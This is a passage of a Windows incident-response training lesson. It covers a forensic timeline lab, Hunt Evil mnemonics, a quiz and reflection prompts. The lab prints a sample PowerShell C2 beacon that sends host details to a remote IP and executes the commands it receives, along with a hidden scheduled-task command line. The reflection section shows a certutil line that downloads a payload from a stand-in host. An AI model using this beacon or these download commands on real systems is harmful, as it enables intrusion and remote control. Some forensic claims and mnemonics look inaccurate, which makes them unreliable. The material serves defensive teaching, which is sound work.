-ExecutionPolicy Bypass -File C:\\ProgramData\\update.ps1</Arguments>\n</Exec>\n</Actions>\n</Task>\n```\n\n**Key findings**:\n- **Author**: WKS-042\\admin-account (source system name revealed!)\n- **Creation time**: 2024-12-20 16:18:35 (during RDP session)\n- **Trigger**: Every 1 hour starting at 5 PM\n- **Action**: Execute C:\\ProgramData\\update.ps1\n\n---\n\n### Step 5: Analyze Malicious PowerShell Script\n\n```powershell\n# Examine the malicious script\nGet-Content \"C:\\ProgramData\\update.ps1\"\n```\n\n**Output** (example malicious beacon script):\n```powershell\n# Obfuscated C2 beacon\n$wc = New-Object System.Net.WebClient\n$url = \"https://203.0.113.50/beacon\"\n$data = @{\nhostname = $env:COMPUTERNAME\nuser = $env:USERNAME\nip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'}).IPAddress\n}\n$body = ($data | ConvertTo-Json)\ntry {\n$response = $wc.UploadString($url, $body)\nInvoke-Expression $response  # Execute commands from C2\n} catch {\n# Silent failure\n}\n```\n\n**Analysis**:\n- **C2 Server**: 203.0.113.50 (matches SOC alert!)\n- **Beacon frequency**: Every 1 hour (scheduled task trigger)\n- **Capability**: Exfiltrates hostname, username, IP; receives commands from C2\n\n---\n\n### Step 6: Check File System Timestamps\n\n```powershell\n# Get file metadata for timeline\nGet-Item \"C:\\ProgramData\\update.ps1\" | Select-Object CreationTime, LastWriteTime, LastAccessTime\n\n# Output:\n# CreationTime    : 12/20/2024 4:17:52 PM\n# LastWriteTime   : 12/20/2024 4:17:52 PM\n# LastAccessTime  : 12/20/2024 5:00:15 PM (first execution by scheduled task)\n```\n\n---\n\n### Step 7: Hunt for PowerShell Execution Evidence\n\n```powershell\n# Check PowerShell operational log for script execution\nGet-WinEvent -FilterHashtable @{\nLogName='Microsoft-Windows-PowerShell/Operational'\nID=4104  # Script Block Logging\nStartTime=(Get-Date).AddDays(-1)\n} | Where-Object {\n$_.Message -match 'update.ps1' -or\n$_.Message -match '203.0.113.50'\n} | Select-Object TimeCreated, Message | Format-List\n\n# Output:\n# TimeCreated: 12/20/2024 5:00:18 PM\n# Message: Creating Scriptblock text (1 of 1):\n#          $wc = New-Object System.Net.WebClient\n#          $url = \"https://203.0.113.50/beacon\"\n#          ...\n```\n\n**Confirmed**: PowerShell script executed at 5:00 PM (first scheduled task trigger).\n\n---\n\n### Step 8: Check Network Connection Evidence (Sysmon)\n\n```powershell\n# If Sysmon is deployed, check for network connections\nGet-WinEvent -FilterHashtable @{\nLogName='Microsoft-Windows-Sysmon/Operational'\nID=3  # Network connection\nStartTime=(Get-Date).AddDays(-1)\n} | Where-Object {\n$_.Message -match '203.0.113.50' -or\n$_.Message -match 'powershell.exe'\n} | Select-Object TimeCreated, Message | Format-List\n\n# Output:\n# TimeCreated: 12/20/2024 5:00:20 PM\n# Message: Network connection detected:\n#          Process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n#          User: SYSTEM\n#          Protocol: TCP\n#          Destination IP: 203.0.113.50:443\n```\n\n**Confirmed**: PowerShell established HTTPS connection to C2 at 5:00 PM.\n\n---\n\n### Step 9: Check Prefetch for Execution Evidence\n\n```powershell\n# Analyze PowerShell prefetch file\n# (Use Eric Zimmerman's PECmd.exe or parse manually)\nPECmd.exe -f \"C:\\Windows\\Prefetch\\POWERSHELL.EXE-*.pf\" --json \"C:\\Forensics\\prefetch.json\"\n\n# Parse JSON output\n$prefetch = Get-Content \"C:\\Forensics\\prefetch.json\" | ConvertFrom-Json\n\n# Extract execution times\n$prefetch.RunTimes | Sort-Object\n\n# Output:\n# 12/20/2024 4:18:10 PM (during RDP session - testing?)\n# 12/20/2024 5:00:18 PM (first scheduled execution)\n# 12/20/2024 6:00:22 PM (second scheduled execution)\n# 12/20/2024 7:00:25 PM (third scheduled execution)\n```\n\n**Analysis**: PowerShell executed 4 times:\n1. During RDP session (attacker testing script)\n2-4. Hourly via scheduled task (beacon activity)\n\n---\n\n### Step 10: Build the Complete Forensic Timeline\n\n```\n┌──────────────────────────────────────────────────────────────────────────────┐\n│  COMPLETE FORENSIC TIMELINE: SRV-WEB02 Compromise                            │\n└──────────────────────────────────────────────────────────────────────────────┘\n\nTIMESTAMP          │ ARTIFACT                       │ EVIDENCE\n───────────────────┼────────────────────────────────┼────────────────────────────\n2024-12-20 16:12:08│ Security.evtx (Event ID 4624)  │ RDP Logon (Type 10)\n│                                │   Source: 10.0.2.50 (WKS-042)\n│                                │   User: admin-account\n───────────────────┼────────────────────────────────┼────────────────────────────\n2024-12-20 16:12:10│ TerminalServices-RCM.evtx      │ RDP authentication success\n│ (Event ID 1149)                │   User: admin-account\n│                                │   Source: 10.0.2.50\n───────────────────┼────────────────────────────────┼────────────────────────────\n2024-12-20 16:17:52│ File System                    │ update.ps1 created\n│                                │   C:\\ProgramData\\update.ps1\n│                                │   (malicious C2 beacon script)\n───────────────────┼────────────────────────────────┼────────────────────────────\n2024-12-20 16:18:10│ Prefetch                       │ powershell.exe executed\n│                                │   (attacker testing script)\n───────────────────┼────────────────────────────────┼────────────────────────────\n2024-12-20 16:18:35│ TaskScheduler.evtx (ID 106)    │ Scheduled task created\n│                                │   Name: UpdateChecker\n│                                │   Action: Execute update.ps1\n│                                │   Trigger: Hourly at 5 PM\n───────────────────┼────────────────────────────────┼────────────────────────────\n2024-12-20 16:18:35│ File System (Task XML)         │ Task metadata\n│ C:\\Windows\\System32\\Tasks\\... │   Author: WKS-042\\admin-account\n│                                │   (reveals source system!)\n───────────────────┼────────────────────────────────┼────────────────────────────\n2024-12-20 16:25:00│ Security.evtx (Event ID 4779)  │ RDP session disconnected\n│                                │   Duration: 13 minutes\n───────────────────┼────────────────────────────────┼────────────────────────────\n2024-12-20 17:00:18│ PowerShell.evtx (ID 4104)      │ Script execution (1st beacon)\n│                                │   Script: update.ps1\n───────────────────┼────────────────────────────────┼────────────────────────────\n2024-12-20 17:00:20│ Sysmon (Event ID 3)            │ Network connection\n│                                │   Process: powershell.exe\n│                                │   Dest: 203.0.113.50:443\n│                                │   (C2 beacon!)\n───────────────────┼────────────────────────────────┼────────────────────────────\n2024-12-20 18:00:22│ Prefetch                       │ powershell.exe (2nd beacon)\n───────────────────┼────────────────────────────────┼────────────────────────────\n2024-12-20 19:00:25│ Prefetch                       │ powershell.exe (3rd beacon)\n───────────────────┼────────────────────────────────┼────────────────────────────\n```\n\n---\n\n### Step 11: Incident Response Conclusions\n\n**Attack Summary**:\n\n**Initial Access**:\n- Attacker used stolen credentials (admin-account) to RDP from WKS-042 (10.0.2.50) to SRV-WEB02\n- RDP session: 2024-12-20 16:12 - 16:25 (13 minutes)\n\n**Persistence**:\n- Created scheduled task \"UpdateChecker\" to execute malicious PowerShell script hourly\n- Task mimics legitimate Windows update process for evasion\n\n**Command and Control**:\n- Deployed C2 beacon script (C:\\ProgramData\\update.ps1)\n- Beacons to 203.0.113.50:443 every hour\n- Capable of receiving commands from C2\n\n**Lateral Movement Source**:\n- Compromised system: WKS-042 (10.0.2.50)\n- Evidence: Scheduled task Author field \"WKS-042\\admin-account\"\n\n**Recommended Actions**:\n1. **Contain**: Isolate SRV-WEB02 and WKS-042 from network\n2. **Credentials**: Reset admin-account password, force re-authentication all sessions\n3. **Persistence**: Delete scheduled task and update.ps1 script\n4. **Threat Intel**: Query 203.0.113.50 in threat feeds (known C2?)\n5. **Scope**: Hunt for same IOCs on other systems\n- Scheduled tasks with Author=WKS-042\n- Connections to 203.0.113.50\n- Files in C:\\ProgramData with .ps1 extension\n6. **Forensics**: Preserve evidence (disk image, memory dump, event logs)\n\n**Lab Complete!** You've successfully:\n✅ Identified lateral movement technique (RDP)\n✅ Built forensic timeline from multiple artifacts\n✅ Correlated Event Logs, Registry, and File System evidence\n✅ Discovered persistence mechanism (scheduled task)\n✅ Identified C2 infrastructure\n✅ Determined scope (source system WKS-042)\n\nThis is real-world incident response using the SANS Hunt Evil methodology."
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "## Memory Aids: SANS Hunt Evil Poster Concepts\n\n### Process Baseline: \"SYSCLAW LEWIS\" (System Processes)\n\n**S** - **System** (system.exe) - kernel-mode, no parent, Local System, boot time\n**Y** - **smss** (smss.exe) - Session Manager, parent=System, creates sessions\n**S** - **Services** (services.exe) - Service Control Manager, parent=wininit.exe\n**C** - **Csrss** (csrss.exe) - Client/Server Runtime, parent=smss.exe (orphaned)\n**L** - **Lsass** (lsass.exe) - Authentication, parent=wininit.exe, ONLY ONE instance\n**A** - **svchost** (svchost.exe) - Service host, parent=services.exe, MANY instances\n**W** - **Wininit** (wininit.exe) - Session 0 init, parent=smss.exe (orphaned)\n\n**L** - **winLogon** (winlogon.exe) - Interactive logon, parent=smss.exe (orphaned)\n**E** - **Explorer** (explorer.exe) - User shell, parent=userinit.exe (orphaned)\n**W** - **WmiPrvSE** (wmiprvse.exe) - WMI Provider Host, parent=svchost.exe\n**I** - **Idle** (System Idle Process) - CPU idle time, not real process\n**S** - **Secure System** (Secure System) - VBS/Credential Guard on Win10+\n\n### svchost.exe Red Flags: \"PUPS\" (When svchost is Suspicious)\n\n**P** - **Parent wrong**: Should be services.exe, NOT explorer.exe or other\n**U** - **User wrong**: Should be SYSTEM/Network Service/Local Service, NOT user account\n**P** - **Path wrong**: Should be C:\\Windows\\System32, NOT C:\\Temp or user directories\n**S** - **Spelling wrong**: svchost.exe vs svch0st.exe (zero), scvhost.exe (typo)\n\n### lsass.exe Critical Rules: \"ONE WIFE\" (lsass Baseline)\n\n**O** - **One instance ONLY**: Never more than one lsass.exe process\n**N** - **No children**: Rarely spawns child processes (except EFS)\n**E** - **Exclusive user**: Always Local System account\n\n**W** - **Wininit parent**: Parent should be wininit.exe (or appear orphaned)\n**I** - **Isolated location**: C:\\Windows\\System32\\lsass.exe ONLY\n**F** - **Frequent target**: Mimikatz dumps LSASS memory for credentials\n**E** - **Early start**: Starts within seconds of boot time\n\n### Evidence Sources: \"REEF\" (Three Pillars)\n\n**R** - **Registry** (configuration, historical execution)\n**E** - **Event Logs** (what happened, when, who)\n**E** - **Executables** (file system artifacts: Prefetch, AmCache, SRUM)\n**F** - **Forensics** (memory dumps, disk images, network captures)\n\n### Lateral Movement Techniques: \"RPWS\" (Common Methods)\n\n**R** - **RDP** (Remote Desktop Protocol) - Logon Type 10, Event ID 4624\n**P** - **PsExec** - Service install, psexesvc.exe, Event ID 7045\n**W** - **WMI/WMIC** - wmiprvse.exe, remote command execution\n**S** - **Scheduled tasks** - at.exe, schtasks.exe, Event ID 4698/106\n\n### RDP Detection: \"SERF\" (Source and Destination)\n\n**SOURCE** (Attacker's system):\n**S** - **Security Event ID 4648** (alternate credentials)\n**E** - **Event RDPClient** (Event ID 1024, 1102 - destination host/IP)\n**R** - **Registry Terminal Server Client\\Servers** (RDP destinations)\n**F** - **Files**: mstsc.exe prefetch, bitmap cache, jump lists\n\n**DESTINATION** (Target system):\n**S** - **Security Event ID 4624** (Logon Type 10)\n**E** - **Event ID 4778/4779** (session connect/disconnect)\n**R** - **RdpCoreTS Event ID 131** (connection attempts)\n**F** - **Files**: rdpclip.exe, tstheme.exe prefetch\n\n### PsExec Detection: \"SAPS\" (Key Indicators)\n\n**S** - **Service Install**: Event ID 7045 (System.evtx) - PSEXESVC service\n**A** - **Admin$ Share Access**: Event ID 5140 (Security.evtx)\n**P** - **PsExesvc.exe**: C:\\Windows\\psexesvc.exe file created\n**S** - **Source IP**: Event ID 4624 Logon Type 3 from attacker system\n\n### Timeline Correlation: \"CRAFT\" (Building Timelines)\n\n**C** - **Collect** artifacts from Event Logs, Registry, File System\n**R** - **Review** timestamps for temporal relationships\n**A** - **Align** events chronologically (sort by time)\n**F** - **Filter** noise (focus on relevant time windows)\n**T** - **Tie** evidence together (same IP, user, process = related events)\n\n### Evidence of Program Execution: \"SUPER BAJ\" (7 Artifacts)\n\n**S** - **ShimCache** (SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache)\n**U** - **UserAssist** (NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist)\n**P** - **Prefetch** (C:\\Windows\\Prefetch\\*.pf)\n**E** - **Event Logs** (Sysmon Event ID 1, Security Event ID 4688)\n**R** - **RecentApps** (NTUSER.DAT\\...\\TaskBar\\RecentApps)\n\n**B** - **BAM/DAM** (SYSTEM\\CurrentControlSet\\Services\\bam\\UserSettings)\n**A** - **AmCache** (C:\\Windows\\AppCompat\\Programs\\Amcache.hve)\n**J** - **Jump Lists** (AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations)\n\n### Visual: Process Legitimacy Checklist\n\n```\n┌────────────────────────────────────────────────────────────────┐\n│  IS THIS PROCESS LEGITIMATE? (PUPS-U Check)                   │\n└────────────────────────────────────────────────────────────────┘\n\nProcess: svchost.exe\n\n✅ Parent: services.exe\n✅ User: Local System\n✅ Path: C:\\Windows\\System32\\svchost.exe\n✅ Spelling: svchost.exe (correct)\n\n└──> LEGITIMATE PROCESS\n\n─────────────────────────────────────────────────────────────────\n\nProcess: svchost.exe\n\n❌ Parent: explorer.exe (should be services.exe)\n❌ User: jdoe (should be SYSTEM)\n❌ Path: C:\\Users\\Public\\svchost.exe (wrong location)\n✅ Spelling: svchost.exe (correct)\n\n└──> MALWARE MASQUERADING AS SVCHOST.EXE\n```bash\n\n### Prefetch vs AmCache vs BAM/DAM: \"PAB Time\"\n\n**Prefetch** (P):\n- **What**: Execution evidence for performance optimization\n- **Where**: C:\\Windows\\Prefetch\\{exename}-{hash}.pf\n- **Time**: Last **8 execution times** (Win8+), first/last (Win7)\n- **Limit**: 128 files (XP/Win7), 1024 files (Win8+)\n- **Best for**: Recent executions, run count\n\n**AmCache** (A):\n- **What**: Application compatibility database\n- **Where**: C:\\Windows\\AppCompat\\Programs\\Amcache.hve\n- **Time**: **First execution time** (earliest run)\n- **Bonus**: SHA1 hash, file size, publisher metadata\n- **Best for**: Historical execution, malware hashing\n\n**BAM/DAM** (B):\n- **What**: Background Activity Moderator (power management)\n- **Where**: SYSTEM\\CurrentControlSet\\Services\\bam\\UserSettings\\{SID}\n- **Time**: **Last execution time per user**\n- **Limit**: ~7 days of data (Win10+ only)\n- **Best for**: Per-user attribution, recent activity\n\n**When to use each**:\n- **Need first run time?** → AmCache\n- **Need multiple execution times?** → Prefetch\n- **Need per-user execution?** → BAM/DAM\n- **Need all three?** → Correlate for complete picture!"
      }
    },
    {
      "type": "quiz",
      "content": {
        "text": "## Knowledge Check: SANS Hunt Evil Forensics\n\n**Question 1**: You discover a process named 'lsass.exe' with parent process 'services.exe' running from C:\\Windows\\System32\\lsass.exe under Local System account. Is this suspicious?\n\n**Answer**: **Yes, this is suspicious.** While the path, user account, and spelling are correct, the **parent process should be wininit.exe, NOT services.exe**. This could be malware with the correct name and location but incorrect parent process relationship. Always verify the full process tree, not just individual attributes.\n\n---\n\n**Question 2**: During timeline analysis, you find:\n- 14:30:15 - Event ID 4648 (alternate credentials) on WKS-042\n- 14:30:18 - Event ID 5140 (ADMIN$ share access) on SRV-DB01 from 10.0.2.50\n- 14:30:20 - Event ID 7045 (service install: PSEXESVC) on SRV-DB01\n- 14:30:22 - psexesvc.exe created in C:\\Windows on SRV-DB01\n\nWhat lateral movement technique does this indicate and what is the source system?\n\n**Answer**: **PsExec lateral movement from WKS-042 (10.0.2.50) to SRV-DB01**. The evidence sequence is textbook PsExec:\n1. Alternate credentials used (Event 4648)\n2. ADMIN$ share accessed (PsExec requirement)\n3. Service installed (PSEXESVC)\n4. Service executable deployed\n\nThe source IP 10.0.2.50 combined with Event 4648 on WKS-042 identifies the compromised system.\n\n---\n\n**Question 3**: You find 'evil.exe' in C:\\Users\\Public\\ with these timestamps:\n- **Created**: 2024-12-20 14:25:30\n- **Modified**: 2024-12-18 10:15:22\n- **Accessed**: 2024-12-20 14:28:15\n\nWhy is the Modified time BEFORE the Created time, and what does this indicate?\n\n**Answer**: **Modified time before Created time indicates the file was COPIED to this system** (not created locally). When a file is copied:\n- **Created time** = time of copy operation (14:25:30)\n- **Modified time** = preserved from original file (14:18 on source system)\n- **Accessed time** = when file was last opened/executed (14:28:15)\n\nThis is a **strong indicator of lateral movement** - the attacker copied malware from another system. Investigate source system with IP matching network logs around 14:25:30.\n\n---\n\n**Question 4**: Where should you look to find the FIRST execution time of 'malware.exe'?\n\n**Answer**: **AmCache.hve** (C:\\Windows\\AppCompat\\Programs\\Amcache.hve). \n\n**Why**:\n- **Prefetch**: Shows last 8 execution times, but first execution time is only available if it's still in the list (may be overwritten)\n- **AmCache**: Records first time an executable was run AND never overwrites (unless hive is cleared)\n- **BAM/DAM**: Only records LAST execution time, not first\n- **ShimCache**: Records file existence/modification, NOT execution time\n\nAmCache is the **most reliable source for first execution timestamp**.\n\n---\n\n**Question 5**: You're investigating an RDP session. On the DESTINATION system (target server), which prefetch files would you expect to find that indicate RDP activity?\n\n**Answer**: **rdpclip.exe-{hash}.pf and tstheme.exe-{hash}.pf**\n\nThese are RDP-specific processes:\n- **rdpclip.exe**: RDP clipboard synchronization (copy/paste between local and remote)\n- **tstheme.exe**: Terminal Services theme engine (renders remote desktop UI)\n\nIf you find these prefetch files on a server that shouldn't have RDP activity, it's a strong indicator of unauthorized remote access.\n\n**Bonus**: On the SOURCE system (attacker's workstation), you'd find **mstsc.exe-{hash}.pf** (Remote Desktop Client).\n\n---\n\n**Question 6**: You discover a scheduled task named \"WindowsUpdateCheck\" that executes:\n`powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\ProgramData\\update.ps1`\n\nWhat makes this suspicious? (Select all that apply)\n\nA) Task name mimics legitimate Windows tasks\nB) PowerShell flags indicate evasion (NoProfile, Hidden, Bypass)\nC) Script location (C:\\ProgramData) is unusual for legitimate tasks\nD) Legitimate Windows Update uses wuauclt.exe or UsoClient.exe, not PowerShell\n\n**Answer**: **All of the above (A, B, C, D)**\n\nThis is a **classic persistence technique**:\n- **Name mimicry**: Blends in with legit tasks (UpdateChecker, WindowsDefender, SystemMaintenance)\n- **Evasion flags**: NoProfile (no profile loading), Hidden (no window), Bypass (ignore execution policy)\n- **Suspicious location**: Legitimate Windows tasks use System32, not ProgramData\n- **Wrong tool**: Windows Update uses dedicated executables, not PowerShell scripts\n\n**Next steps**: Extract Author from task XML (reveals source system), analyze C:\\ProgramData\\update.ps1 for C2 beaconing.\n\n---\n\n**Question 7**: You're building a forensic timeline. You have these artifacts for 'evil.exe':\n- AmCache: First execution 2024-12-20 14:28:05\n- Prefetch creation: 2024-12-20 14:28:10\n- Sysmon Event ID 1: 2024-12-20 14:28:12\n- BAM: Last execution 2024-12-20 14:28:10\n\nWhich timestamp is the MOST ACCURATE for first execution?\n\n**Answer**: **Prefetch creation time (14:28:10) is most accurate**\n\nReasoning:\n- **Prefetch** is created **~10 seconds after first execution** (delay for file creation)\n- **AmCache** can have slight clock skew or rounding\n- **Sysmon** logs event ~2 seconds after process starts (event processing delay)\n- **BAM** only records last execution (not useful for first time)\n\n**Best practice**: **Prefetch creation - 10 seconds = actual first execution** (14:28:00 in this case).\n\nCorrelate all sources for confidence, but Prefetch is typically most precise for execution timing."
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "## Meta-Learning: Reflect on Forensic Investigation Strategy\n\n### 1. Baseline Knowledge vs Incident Response\n\n**Question**: \"You've memorized the normal process baseline (system.exe, services.exe, lsass.exe, etc.). During an incident, you find a process that EXACTLY matches the baseline. Should you still investigate it?\"\n\n**Why this matters**: Understanding that **normal-looking doesn't mean safe**.\n\n**Critical thinking**: Even if a process has:\n- ✅ Correct name (svchost.exe)\n- ✅ Correct path (C:\\Windows\\System32)\n- ✅ Correct parent (services.exe)\n- ✅ Correct user (Local System)\n\n**It could STILL be malicious if**:\n- DLL hijacking (malicious DLL loaded by legitimate process)\n- Process injection (malware injected into legitimate process memory)\n- Service DLL replacement (attacker replaces legitimate service DLL)\n\n**Best practice**: Baseline knowledge is your **starting point**, not your **endpoint**. Always:\n1. Check process baseline (quick triage)\n2. Examine loaded DLLs (look for unsigned or suspicious DLLs)\n3. Review network connections (does svchost.exe connect to unknown IPs?)\n4. Analyze command-line arguments (unusual parameters?)\n5. Check file hashes (is this the real svchost.exe or a renamed malware?)\n\n**Lesson**: Baselines help you find **obvious anomalies** fast. Deep investigation finds **subtle compromises**.\n\n---\n\n### 2. Artifact Correlation Dependency\n\n**Question**: \"You find evidence of 'evil.exe' execution in Prefetch, but NO corresponding Sysmon Event ID 1 (process creation). What does this tell you?\"\n\n**Why this matters**: Understanding **what the absence of evidence means**.\n\n**Possibilities**:\n1. **Sysmon not deployed** (most common - many orgs lack Sysmon)\n2. **Sysmon logs overwritten** (event log rotation, attacker cleared logs)\n3. **Sysmon evasion** (attacker used technique to bypass Sysmon)\n4. **Prefetch false positive** (file accessed but not executed - rare)\n\n**Key insight**: **Absence of evidence is NOT evidence of absence**.\n\nJust because you don't see a Sysmon event doesn't mean execution didn't happen. Prefetch is MORE reliable than event logs (harder to tamper with).\n\n**Best practice**: Use **multiple artifact sources** and don't rely on any single source:\n- Prefetch + AmCache + Event Logs + Network connections = high confidence\n- Prefetch only = medium confidence (execution likely, but can't prove who/when/how)\n\n---\n\n### 3. Timeline Granularity\n\n**Question**: \"Your timeline shows 'malware.exe' executed at 14:28:10. But you need to know if it executed BEFORE or AFTER another event at 14:28:12. How confident can you be?\"\n\n**Why this matters**: Understanding **timestamp precision limitations**.\n\n**Timestamp accuracy**:\n- **File system (NTFS)**: ~10-100 milliseconds precision\n- **Event logs**: 1 second precision\n- **Prefetch**: 10 seconds precision (file created ~10s after execution)\n- **Network logs**: Microsecond precision (TCP timestamps)\n\n**Clock skew problems**:\n- Different systems may have clocks off by seconds to minutes\n- If attacker came from WKS-042 (clock 2 minutes fast) to SRV-DB01 (accurate clock), timelines may appear wrong\n\n**Best practice**:\n1. **Normalize timestamps** to UTC (not local time zones)\n2. **Correlate by system** first, then cross-system\n3. **Account for clock skew** (±2 minutes is common)\n4. **Use relative ordering** when exact times are ambiguous:\n- \"Event A happened, THEN Event B\" (relative)\n- vs \"Event A at 14:28:10.523\" (absolute)\n\n**Lesson**: Timelines are **approximations**, not absolute truth. Corroborate with logical event sequencing.\n\n---\n\n### 4. Evidence Preservation vs Speed\n\n**Question**: \"You're investigating a live breach. Should you spend 2 hours collecting perfect forensic images, or 10 minutes gathering key artifacts and contain the threat immediately?\"\n\n**Why this matters**: Balancing **forensic integrity** vs **business impact**.\n\n**The dilemma**:\n- **Perfect forensics**: Full disk image, memory dump, network capture = 2-4 hours\n- ✅ Complete evidence for prosecution\n- ❌ Attacker continues causing damage during collection\n- ❌ Business systems offline during imaging\n\n- **Rapid triage**: Key artifacts only (event logs, registry, prefetch) = 10-30 minutes\n- ✅ Fast containment (stop attacker sooner)\n- ✅ Minimal business disruption\n- ❌ May miss some evidence\n\n**Real-world answer**: **Triage first, deep forensics second**\n\n**Triage collection** (10-30 minutes):\n1. Live memory dump (if attacker in memory)\n2. Event logs (Security, System, Sysmon)\n3. Prefetch, AmCache, SRUM\n4. Registry hives (SYSTEM, SOFTWARE, NTUSER.DAT)\n5. Scheduled tasks, startup items\n6. Network connections (netstat)\n\n**Then CONTAIN** (isolate system, block C2 IP, disable accounts)\n\n**Then deep forensics** (full disk image, timeline analysis, malware analysis)\n\n**Lesson**: **Stopping ongoing damage > perfect evidence**. Triage gives you 80% of answers in 20% of time.\n\n---\n\n### 5. Attribution Confidence\n\n**Question**: \"You've identified lateral movement from WKS-042 to SRV-DB01. How do you know WKS-042 is the attacker's system and not another victim?\"\n\n**Why this matters**: Understanding **pivoting vs origination**.\n\n**Critical analysis**:\n\n**Evidence WKS-042 is compromised victim** (attacker pivoted through it):\n- WKS-042 also shows signs of compromise (malware, unusual processes)\n- WKS-042 was accessed FROM another system earlier\n- User account on WKS-042 has legitimate business reason to access SRV-DB01\n\n**Evidence WKS-042 is attacker's origin**:\n- No signs of compromise on WKS-042 itself\n- Unusual behavior for that user/system (accessing servers not normally accessed)\n- WKS-042 has VPN connection or external IP (attacker's entry point)\n\n**Best practice**: **Always trace backwards**\n1. WKS-042 → SRV-DB01 (current finding)\n2. ??? → WKS-042 (trace backwards - where did attacker come from?)\n3. Keep tracing until you find:\n- External IP (attacker's true origin)\n- Initial compromise vector (phishing email, vulnerable app, etc.)\n\n**Lesson**: Lateral movement creates a **chain of compromises**. Find the first link to understand the full attack.\n\n---\n\n### 6. Living Off the Land (LotL) Detection\n\n**Question**: \"Attackers increasingly use legitimate Windows tools (PowerShell, WMI, certutil) instead of custom malware. How do you detect 'normal' tools used maliciously?\"\n\n**Why this matters**: **Behavioral detection vs signature detection**.\n\n**The challenge**: \n- PowerShell.exe is legitimate\n- WMI (wmiprvse.exe) is legitimate\n- Certutil.exe is legitimate\n\n**But attackers abuse them** for:\n- PowerShell: Download malware, execute scripts, lateral movement\n- WMI: Remote execution, persistence, reconnaissance\n- Certutil: Download payloads (certutil -urlcache -split -f http://malware.com/evil.exe)\n\n**Detection strategy**: Look for **context**, not just **tool usage**\n\n**Normal PowerShell**:\n```\nProcess: powershell.exe\nParent: explorer.exe\nUser: jdoe\nCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\n**Malicious PowerShell**:\n```\nProcess: powershell.exe\nParent: w3wp.exe (web server process - webshell!)\nUser: IIS APPPOOL\\DefaultAppPool\nCommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAF...\n```\n\n**Red flags**:\n- ❌ Unusual parent (web server, scheduled task, service)\n- ❌ Encoded/obfuscated commands (-EncodedCommand, -enc)\n- ❌ Bypass flags (-ExecutionPolicy Bypass, -NoProfile)\n- ❌ Hidden execution (-WindowStyle Hidden)\n- ❌ Unusual user context (service account, SYSTEM)\n\n**Best practice**: **Hunt for tool abuse, not tool usage**\n- Don't alert on every PowerShell execution\n- Alert on PowerShell with encoded commands + bypass + hidden window\n- Alert on certutil downloading files from internet\n- Alert on WMI remote execution to multiple systems\n\n**Lesson**: **Context is king**. Legitimate tools + suspicious context = malicious activity.\n\n---\n\n### 7. Continuous Improvement\n\n**Question**: \"After every incident investigation, what's the MOST important question to ask?\"\n\n**Answer**: **\"What detection or forensic artifact did we LACK that would have helped us respond faster?\"**\n\n**Post-incident review checklist**:\n1. **Detection gaps**: What attack phase had no detection? (Initial access? Lateral movement? Exfiltration?)\n2. **Forensic gaps**: What artifacts were missing? (No Sysmon? Event logs overwritten? No network logs?)\n3. **Response speed**: How long to detect? How long to respond? Where were delays?\n4. **Documentation**: Is our playbook updated with lessons learned?\n5. **Training**: What skills did our team lack?\n\n**Example lessons learned**:\n- **Gap**: No detection for scheduled task creation → **Fix**: Enable Event ID 4698, deploy Sysmon Event ID 12/13\n- **Gap**: Event logs only retained 7 days, attacker active 2 weeks → **Fix**: Extend retention to 90 days, forward to SIEM\n- **Gap**: No baseline of normal RDP activity → **Fix**: Document normal RDP sources/destinations, alert on deviations\n\n**This is continuous improvement**: Every incident makes your detection and forensics better.\n\n**Commit to**: After finishing this lesson, document ONE forensic artifact you don't currently collect and implement it."
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "## You're Now a Forensic Investigator: The Hunt Evil Mindset\n\n**Congratulations!** You've completed a comprehensive lesson on forensic timeline investigation using the SANS Hunt Evil methodology.\n\n### What You've Accomplished\n\n✅ **You understand Windows process baselines** (system.exe, services.exe, lsass.exe, svchost.exe, explorer.exe)\n\n✅ **You can detect process anomalies** (wrong parent, wrong path, wrong user, wrong spelling)\n\n✅ **You know how to hunt for lateral movement** (RDP, PsExec, WMI, PowerShell Remoting, Scheduled Tasks)\n\n✅ **You can correlate artifacts across sources** (Event Logs, Registry, File System)\n\n✅ **You've built a complete forensic timeline** (hands-on lab with 10+ correlated artifacts)\n\n✅ **You understand evidence preservation** (Prefetch, AmCache, BAM/DAM, ShimCache)\n\n### The Reality: Incidents Are Messy\n\nHere's the truth about real-world incident response: **It's never as clean as the textbook examples**.\n\n**What the labs don't tell you**:\n- **Logs are missing** (retention too short, logs overwritten, attacker cleared them)\n- **Timestamps conflict** (clock skew between systems, time zone confusion)\n- **Tools aren't deployed** (no Sysmon, no EDR, basic Windows logging only)\n- **Evidence is ambiguous** (is this malicious or just weird user behavior?)\n- **Pressure is intense** (executives demanding answers, business systems offline)\n\n**But here's what you NOW have** that most people don't:\n\n**1. A Framework** (Hunt Evil baseline - know normal, find evil)\n\n**2. A Methodology** (correlate Event Logs, Registry, File System)\n\n**3. Hands-On Experience** (you've built a timeline from raw artifacts)\n\n**4. Confidence** (you know where to look and what to look for)\n\n**This foundation is SOLID.** You can build on it through practice and real-world experience.\n\n### From Learning to Doing: Your 30-Day Challenge\n\n**I challenge you to investigate ONE system in the next 30 days using Hunt Evil methodology**:\n\n**Week 1: Baseline Your Own System**\n- [ ] Open Process Explorer (or Task Manager)\n- [ ] Verify normal processes (system, services, lsass, svchost)\n- [ ] Document YOUR system's baseline (what processes are always running?)\n- [ ] Take screenshots for reference\n\n**Week 2: Collect Forensic Artifacts**\n- [ ] Export Event Logs (Security, System, PowerShell)\n- [ ] Extract Registry hives (SYSTEM, SOFTWARE, NTUSER.DAT)\n- [ ] Copy Prefetch directory (C:\\Windows\\Prefetch)\n- [ ] Save to external drive for analysis\n\n**Week 3: Analyze Artifacts**\n- [ ] Parse Prefetch files (use Eric Zimmerman's PECmd)\n- [ ] Review AmCache.hve (use Eric Zimmerman's AmcacheParser)\n- [ ] Search Event Logs for Event IDs from this lesson\n- [ ] Build a simple timeline (CSV or 